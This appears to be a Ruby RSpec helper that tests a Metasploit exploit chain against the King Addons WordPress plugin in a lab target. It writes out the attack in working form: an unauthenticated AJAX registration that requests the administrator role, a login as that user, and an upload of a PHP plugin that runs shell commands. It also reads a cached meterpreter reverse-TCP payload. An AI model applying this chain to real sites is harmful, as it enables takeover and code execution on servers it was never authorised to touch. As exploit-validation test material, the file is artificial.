# frozen_string_literal: true

require 'nokogiri'
require 'rex/mime/message'
require 'rex/zip'
require_relative '../wp_batch_desync_rce/native'

# Retain independent vendor controls while reusing bounded transport, commands,
# callback, resource and reporting helpers. The core SQLi gate is not invoked.
module KingAddonsNative
  include WordpressBatchChainTarget

  def chain_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-king-addons.json'), JSON.pretty_generate(@chain)) if @chain
  end

  def chain_http(...)
    chain_request(...)
  end

  def chain_identity(label, *)
    output, = chain_command(label, 'app', 'php', '/opt/module-target/control.php', *)
    data = JSON.parse(output)
    (@chain[:identities] ||= []) << { label: label, data: data }
    chain_save
    expect(data.values_at('core', 'php', 'uid', 'selected_release', 'database', 'role')).to eq(['6.8.3', '8.3.28', 33, @release, 'wp_root', 'module_target@%'])
    expect(data.values_at('version', 'constant_version', 'elementor')).to eq(@catalog.values_at('plugin_header_version', 'constant_version') + ['3.21.0'])
    expect(data.fetch('server')).to start_with('11.2.2-MariaDB')
    expect(data.fetch('grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
    expect(data.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
    expect(data.fetch('active_plugins').sort).to eq(['elementor/elementor.php', 'king-addons/king-addons.php'])
    expect(data.values_at('registration_handler', 'users_can_register')).to eq([true, @registration])
    { 'king-addons' => @catalog, 'elementor' => @elementor_catalog }.each do |slug, release|
      expect(data.fetch('archive_sha256').fetch(slug)).to eq(release.fetch('sha256'))
      expect(data.fetch('installed_sha256').fetch(slug)).to eq(release.fetch('installed_sha256'))
    end
    expect(data.values_at('home', 'siteurl')).to eq(['http://module-target.test' + @prefix] * 2)
    %w[plugins upload_base upload_current].each do |key|
      expect(data.fetch('filesystem').fetch(key).values_at('uid', 'writable')).to eq([33, true])
    end
    expect(data.fetch('filesystem').fetch('upload_error')).to be(false)
    expect(data.fetch('filesystem').fetch('disk_free_bytes')).to be > 16_777_216
    data
  end

  def king_selected_state(identity)
    identity.except('filesystem', 'operation_result')
  end

  def king_cached_payload(identifier, label)
    # Read the session's actual cached EncodedPayload without generating new bytes.
    output = console_command(%(irb -e 'session=framework.sessions[#{Integer(identifier)}]; exploit=session&.exploit; cached=exploit&.payload; raise "Missing cached EncodedPayload" unless cached.is_a?(Msf::EncodedPayload) && cached.encoded.is_a?(String); raw=cached.encoded.dup; path=File.join(Msf::Config.config_directory,"cached-payload-#{Integer(identifier)}.bin"); File.open(path,"wb",0o600){|file|file.write(raw)}; puts "KING_CACHED=" + {sid:session.sid,exploit_id:exploit.object_id,payload_ref:exploit.payload_instance.refname,extensions:exploit.datastore["EXTENSIONS"],path:path,bytes:raw.bytesize,sha256:Digest::SHA256.hexdigest(raw)}.to_json'))
    capture = JSON.parse(output.match(/^KING_CACHED=(.+)$/)[1])
    expect(capture.fetch('sid')).to eq(Integer(identifier))
    expect(capture.fetch('payload_ref')).to eq('php/meterpreter_reverse_tcp')
    path = capture.fetch('path')
    expect(File.realpath(path)).to start_with(File.realpath(ENV.fetch('MSF_CFGROOT_CONFIG')) + '/')
    raw = File.binread(path)
    expect([raw.bytesize, Digest::SHA256.hexdigest(raw)]).to eq(capture.values_at('bytes', 'sha256'))
    @chain.fetch(:cached_payloads) << capture.merge('label' => label)
    chain_save
  end

  def king_baseline_user_count
    @existing_role.empty? ? 4 : 5
  end

  def chain_assert_restored(current, original = @baseline)
    expect(king_selected_state(current)).to eq(king_selected_state(original))
  end

  def king_fields(response)
    Nokogiri::HTML(response.body).css('input[name]').to_h { |input| [input['name'], input['value'].to_s] }
  end

  def king_cookies(response)
    Array(response.get_fields('set-cookie')).to_h { |text| text.split(';', 2).first.split('=', 2) }.map { |name, value| name + '=' + value }.join('; ')
  end

  def king_cookie_id(label, response)
    values = Array(response.get_fields('set-cookie')).filter_map do |text|
      text.split(';', 2).first.split('=', 2).last if text.start_with?('wordpress_logged_in_')
    end
    cookie = URI.decode_www_form_component(values.reverse.find { |value| !value.empty? }.to_s)
    chain_identity(label + '-cookie', 'cookie', Base64.strict_encode64(cookie)).fetch('operation_result').fetch('validated_user_id')
  end

  def king_login(label, name, password, agent)
    form = chain_http(label + '-form', @prefix + '/wp-login.php', headers: { 'User-Agent' => agent })
    expect(form.code).to eq('200')
    response = chain_http(label, @prefix + '/wp-login.php', { 'log' => name, 'pwd' => password, 'wp-submit' => 'Log In', 'testcookie' => '1' }, form: true, headers: { 'Cookie' => king_cookies(form), 'User-Agent' => agent })
    expect(response.code).to eq('302')
    [king_cookies(response), king_cookie_id(label, response)]
  end

  def king_admin_page(label, cookie, agent, identifier, name, allowed: true)
    8.times do |step|
      response = chain_http(label + '-' + step.to_s, @prefix + '/wp-admin/users.php', headers: { 'Cookie' => cookie, 'User-Agent' => agent })
      unless allowed
        expect(%w[302 403]).to include(response.code)
        return response
      end
      if response.code == '200'
        expect(Nokogiri::HTML(response.body).at_css('tr#user-' + identifier.to_s)&.text).to include(name)
        return response
      end
      expect(response.code).to eq('302')
      location = URI(response.fetch('location'))
      expect(%w[module-target.test 127.0.0.1]).to include(location.host)
      expect(location.path).to start_with(@prefix + '/wp-admin/')
      route = location.path + (location.query ? '?' + location.query : '')
      chain_http(label + '-activation-' + step.to_s, route, headers: { 'Cookie' => cookie, 'User-Agent' => agent })
    end
    raise 'Native activation redirects did not reach the real users page'
  end

  def king_native_plugin(label, cookie, agent)
    path = @prefix + '/wp-content/plugins/native_king_probe/native-proof.php'
    expect(chain_http(label + '-absent', path).code).to eq('404')
    upload = chain_http(label + '-form', @prefix + '/wp-admin/plugin-install.php?tab=upload', headers: { 'Cookie' => cookie, 'User-Agent' => agent })
    expect(upload.code).to eq('200')
    source = File.binread(File.join(__dir__, 'probe-plugin.php'))
    archive = Rex::Zip::Archive.new
    archive.add_file('native_king_probe/native-proof.php', source)
    multipart = Rex::MIME::Message.new
    multipart.add_part(king_fields(upload).fetch('_wpnonce'), nil, nil, 'form-data; name="_wpnonce"')
    multipart.add_part('Install Now', nil, nil, 'form-data; name="install-plugin-submit"')
    multipart.add_part(archive.pack, 'application/zip', 'binary', 'form-data; name="pluginzip"; filename="native-king.zip"')
    response = chain_http(label + '-upload', @prefix + '/wp-admin/update.php?action=upload-plugin', multipart.to_s, raw: true, headers: { 'Cookie' => cookie, 'User-Agent' => agent, 'Content-Type' => 'multipart/form-data; boundary=' + multipart.bound })
    expect(response.code).to eq('200')
    proof = chain_http(label + '-execution', path)
    expect(proof.code).to eq('200')
    data = JSON.parse(proof.body)
    expect(data.values_at('marker', 'uid', 'bash')).to eq(['MODULE_TARGET_NATIVE_KING_PROOF', 33, true])
    expect(data.fetch('shell')).to start_with('uid=33(')
    (@chain[:native_execution] ||= []) << { label: label, **data }
    chain_identity(label + '-removed', 'delete-plugin', Digest::SHA256.hexdigest(source))
  end

  def chain_native_gate(phase)
    boot = chain_identity(phase + '-boot')
    expect(boot.fetch('users').length).to eq(king_baseline_user_count)
    expect(boot.fetch('users').map { |user| user.fetch('sessions') }).to all(eq([]))
    unless @existing_role.empty?
      existing = boot.fetch('users').find { |user| user['user_login'] == 'module_king_existing' }
      expect(existing.values_at('ID', 'roles', 'install_plugins')).to eq([5, [@existing_role], @existing_role == 'administrator'])
      expect(chain_identity(phase + '-existing-password', 'password', 'module_king_existing', 'Module-target-king+2026!').fetch('operation_result').fetch('valid')).to be(true)
    end
    expect(chain_http(phase + '-home', @prefix + '/').code).to eq('200')
    readme = chain_http(phase + '-readme', @prefix + '/wp-content/plugins/king-addons/readme.txt')
    expect(readme.code).to eq('200')
    expect(readme.body).to include('Stable tag: ' + @release)
    agent = "module-target-king-native-#{Process.pid}-#{phase}-control"
    unless @existing_role.empty?
      existing_cookie, existing_id = king_login(phase + '-existing', 'module_king_existing', 'Module-target-king+2026!', agent)
      expect(existing_id).to eq(5)
      king_admin_page(phase + '-existing-admin', existing_cookie, agent, 5, 'module_king_existing', allowed: @existing_role == 'administrator')
      chain_identity(phase + '-existing-sessions-cleared', 'clear-sessions', 'module_king_existing', agent)
    end
    cookie, identifier = king_login(phase + '-control', 'module_admin', 'module-target-password', agent)
    expect(identifier).to eq(1)
    king_admin_page(phase + '-control-admin', cookie, agent, 1, 'module_admin')
    king_native_plugin(phase + '-control-native', cookie, agent)
    chain_identity(phase + '-control-sessions-cleared', 'clear-sessions', 'module_admin', agent)

    page = chain_http(phase + '-widget', boot.fetch('registration_route'))
    expect(page.code).to eq('200')
    document = Nokogiri::HTML(page.body)
    expect(document.at_css('.elementor-widget-king-addons-login-register-form')).not_to be_nil
    script = document.css('script').map(&:text).find { |text| text.include?('king_addons_login_register_vars') }
    expect(script).not_to be_nil
    match = script.match(/\bking_addons_login_register_vars\s*=\s*(\{.*\});/m)
    expect(match).not_to be_nil
    localized = JSON.parse(match[1])
    nonce = localized.fetch('register_nonce')
    expect(nonce).not_to be_empty
    if @registration
      expect(king_fields(page).fetch('king_addons_register_nonce')).to eq(nonce)
    else
      expect(king_fields(page)).not_to have_key('king_addons_register_nonce')
    end
    original = chain_identity(phase + '-baseline')
    boot_state = king_selected_state(boot)
    original_state = king_selected_state(original)
    delta_keys = boot_state.keys.reject { |key| boot_state[key] == original_state[key] }
    (@chain[:initialization_deltas] ||= []) << { phase: phase, keys: delta_keys }

    name = 'native_king_probe'
    password = 'Module-target-king+2026!'
    agent = "module-target-king-native-#{Process.pid}-#{phase}-created"
    parameters = { 'action' => 'king_addons_user_register', 'nonce' => nonce, 'username' => name, 'email' => 'native-king@example.test', 'password' => password, 'confirm_password' => password, 'user_role' => 'administrator', 'terms_required' => 'no' }
    response = chain_http(phase + '-native-registration', @prefix + '/wp-admin/admin-ajax.php', parameters, form: true, headers: { 'User-Agent' => agent })
    expect(response.code).to eq('200')
    user = nil
    if @registration
      expect(JSON.parse(response.body).fetch('success')).to be(true)
      registered = chain_identity(phase + '-created', 'password', name, password)
      user = registered.fetch('users').find { |entry| entry.fetch('user_login') == name }
      expect(user).not_to be_nil
      expect(user.values_at('roles', 'install_plugins')).to eq([@affected ? ['administrator'] : ['subscriber'], @affected])
      expect(registered.fetch('operation_result').fetch('valid')).to be(true)
      cookie, identifier = king_login(phase + '-created-login', name, password, agent)
      expect(identifier).to eq(user.fetch('ID'))
      king_admin_page(phase + '-created-admin', cookie, agent, identifier, name, allowed: @affected)
      if @affected
        king_native_plugin(phase + '-created-native', cookie, agent)
      else
        denied = chain_http(phase + '-created-upload-denied', @prefix + '/wp-admin/plugin-install.php?tab=upload', headers: { 'Cookie' => cookie, 'User-Agent' => agent })
        expect(%w[302 403]).to include(denied.code)
      end
      restored = chain_identity(phase + '-native-cleanup', 'delete-user', name, password)
    else
      result = JSON.parse(response.body)
      expect(result.values_at('success', 'data')).to eq([false, { 'message' => 'User registration is disabled.' }])
      restored = chain_identity(phase + '-registration-disabled')
      expect(restored.fetch('users').any? { |entry| entry['user_login'] == name }).to be(false)
    end
    chain_assert_restored(restored, original)
    callback = chain_callback_probe
    chain_resources(phase, %w[app db reporting_db])
    @chain.fetch(:controls) << { phase: phase, genuine_widget_nonce: true, original_admin_login_and_upload: true, registration_enabled: @registration, registered_role: user&.fetch('roles'), selected_state_restored: true, passed: true }
    chain_save
    [original, callback]
  end
end
